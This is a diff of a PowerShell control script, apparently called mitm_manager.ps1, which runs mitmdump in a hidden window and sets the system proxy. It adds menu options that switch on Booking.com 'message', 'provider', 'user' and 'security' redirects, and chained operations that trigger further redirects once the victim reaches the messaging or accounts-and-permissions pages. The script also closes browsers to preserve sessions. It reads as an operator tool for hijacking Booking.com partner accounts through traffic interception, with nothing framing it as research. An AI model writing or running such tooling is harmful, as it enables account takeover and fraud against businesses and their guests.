@@ -1,4 +1,3 @@
-# mitm_manager.ps1
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
@@ -14,6 +13,12 @@ $MitmExeSearch = @(
 )
 $ForceFlag = "C:\temp\mitm_force_redirect"
 $OneShotFlag = "C:\temp\mitm_reset_once"
+$MessageFlag = "C:\temp\mitm_message_once"
+$ProviderFlag = "C:\temp\mitm_provider_once"
+$UserFlag = "C:\temp\mitm_user_once"
+$SecurityFlag = "C:\temp\mitm_security_once"
+$Operation11Flag = "C:\temp\mitm_operation_11_once"
+$Operation12Flag = "C:\temp\mitm_operation_12_once"
 $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
 # -----------------------------------------
 
@@ -190,7 +195,6 @@ function Close-Browsers-Gracefully {
 
     Log-Write "Closing browsers gracefully to preserve session..."
 
-    # Ð¡Ð½Ð°Ñ‡Ð°Ð»Ð° Ð¿Ñ‹Ñ‚Ð°ÐµÐ¼ÑÑ Ð·Ð°ÐºÑ€Ñ‹Ñ‚ÑŒ Ñ‡ÐµÑ€ÐµÐ· CloseMainWindow (ÑÐ¾Ñ…Ñ€Ð°Ð½ÑÐµÑ‚ ÑÐµÑÑÐ¸ÑŽ)
     Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
         try {
             if ($_.CloseMainWindow()) {
@@ -204,7 +208,6 @@ function Close-Browsers-Gracefully {
     Start-Sleep -Seconds 3
 
     if ($closeOption -eq "full") {
-        # Ð•ÑÐ»Ð¸ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð¾ Ð¿Ð¾Ð»Ð½Ð¾Ðµ Ð·Ð°ÐºÑ€Ñ‹Ñ‚Ð¸Ðµ, ÑƒÐ±Ð¸Ð²Ð°ÐµÐ¼ Ð¾ÑÑ‚Ð°Ð²ÑˆÐ¸ÐµÑÑ Ð¿Ñ€Ð¾Ñ†ÐµÑÑÑ‹
         Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
             try {
                 Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
@@ -215,7 +218,6 @@ function Close-Browsers-Gracefully {
         }
         Log-Write "All browsers fully closed."
     } else {
-        # Ð•ÑÐ»Ð¸ Ð²Ñ‹Ð±Ñ€Ð°Ð½Ð¾ graceful, Ð¾ÑÑ‚Ð°Ð²Ð»ÑÐµÐ¼ ÐºÐ°Ðº ÐµÑÑ‚ÑŒ
         $remaining = Get-Process -Name chrome,msedge,firefox -ErrorAction SilentlyContinue
         if ($remaining) {
             Log-Write ("Some browsers still running (user may have canceled close): {0}" -f ($remaining.ProcessName -join ", "))
@@ -241,7 +243,6 @@ function Start-Mitmdump {
     $args = @("-p", "$MitmPort", "-s", "$PyAddon")
 
     Log-Write ("Starting mitmdump: {0} {1}" -f $mitmPath, ($args -join ' '))
-    # Ð—ÐÐŸÐ£Ð¡Ðš Ð’ Ð¡ÐšÐ Ð«Ð¢ÐžÐœ Ð Ð•Ð–Ð˜ÐœÐ• - WindowStyle Hidden
     $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
 
     Start-Sleep -Seconds 2
@@ -257,6 +258,12 @@ function Enable-ForceRedirect {
     }
     New-Item -ItemType File -Path $ForceFlag -Force | Out-Null
     Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Log-Write "Force redirect enabled."
     Start-Mitmdump
 }
@@ -267,8 +274,132 @@ function Enable-OneShotRedirect {
     }
     New-Item -ItemType File -Path $OneShotFlag -Force | Out-Null
     Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
     Log-Write "One-shot redirect enabled."
     Start-Mitmdump
+}
+
+function Enable-MessageRedirect {
+    if (-not (Test-Path (Split-Path $MessageFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Log-Write "Booking.com message redirect enabled."
+    Start-Mitmdump
+}
+
+function Enable-ProviderRedirect {
+    if (-not (Test-Path (Split-Path $ProviderFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $ProviderFlag -Force | Out-Null
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Log-Write "Booking.com provider redirect enabled."
+    Start-Mitmdump
+}
+
+function Enable-UserRedirect {
+    if (-not (Test-Path (Split-Path $UserFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Log-Write "Booking.com user redirect enabled."
+    Start-Mitmdump
+}
+
+function Enable-SecurityRedirect {
+    if (-not (Test-Path (Split-Path $SecurityFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $SecurityFlag -Force | Out-Null
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    Log-Write "Booking.com security redirect enabled."
+    Start-Mitmdump
+}
+
+function Enable-Operation11Redirect {
+    Log-Write "Starting Operation 11 sequence (function 7 -> messaging/settings page -> function 8)..."
+    
+    # Создаем флаг операции 11 и включаем функцию 7 (message redirect)
+    if (-not (Test-Path (Split-Path $Operation11Flag))) {
+        New-Item -ItemType Directory -Path (Split-Path $Operation11Flag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $Operation11Flag -Force | Out-Null
+    
+    if (-not (Test-Path (Split-Path $MessageFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
+    
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
+    
+    Start-Mitmdump
+    
+    Log-Write "Operation 11: Function 7 (message redirect) enabled."
+    Log-Write "Function 8 (provider redirect) will activate when user reaches messaging/settings page."
+}
+
+function Enable-Operation12Redirect {
+    Log-Write "Starting Operation 12 sequence (function 9 -> accounts_and_permissions page -> function 10)..."
+    
+    # Создаем флаг операции 12 и включаем функцию 9 (user redirect)
+    if (-not (Test-Path (Split-Path $Operation12Flag))) {
+        New-Item -ItemType Directory -Path (Split-Path $Operation12Flag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $Operation12Flag -Force | Out-Null
+    
+    if (-not (Test-Path (Split-Path $UserFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $UserFlag -Force | Out-Null
+    
+    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
+    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
+    
+    Start-Mitmdump
+    
+    Log-Write "Operation 12: Function 9 (user redirect) enabled."
+    Log-Write "Function 10 (security redirect) will activate when user reaches accounts_and_permissions page."
 }
 
 # ---------------- MAIN ----------------
@@ -313,7 +444,13 @@ while ($true) {
     Write-Host "4) Disable redirects"
     Write-Host "5) Tail log"
     Write-Host "6) Safe exit"
-    $opt = Read-Host "Choose option (1-6)"
+    Write-Host "7) Enable Booking.com message redirect"
+    Write-Host "8) Enable Booking.com provider redirect"
+    Write-Host "9) Enable Booking.com user redirect"
+    Write-Host "10) Enable Booking.com security redirect"
+    Write-Host "11) Enable Operation 11 (function 7 -> messaging/settings -> function 8)"
+    Write-Host "12) Enable Operation 12 (function 9 -> accounts_and_permissions -> function 10)"
+    $opt = Read-Host "Choose option (1-12)"
 
     switch ($opt) {
         "1" {
@@ -326,6 +463,12 @@ while ($true) {
         "4" {
             Remove-Item -Path $ForceFlag -Force -ErrorAction SilentlyContinue
             Remove-Item -Path $OneShotFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $MessageFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $ProviderFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $UserFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $SecurityFlag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $Operation11Flag -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path $Operation12Flag -Force -ErrorAction SilentlyContinue
             Clear-SystemProxies | Out-Null
             Reset-Proxy-And-Stop-Mitmdump
             Log-Write "Redirects disabled and proxy cleared."
@@ -338,6 +481,12 @@ while ($true) {
             }
         }
         "6" { Safe-Exit }
+        "7" { Enable-MessageRedirect }
+        "8" { Enable-ProviderRedirect }
+        "9" { Enable-UserRedirect }
+        "10" { Enable-SecurityRedirect }
+        "11" { Enable-Operation11Redirect }
+        "12" { Enable-Operation12Redirect }
         default { Write-Host "Invalid choice" }
     }
 }
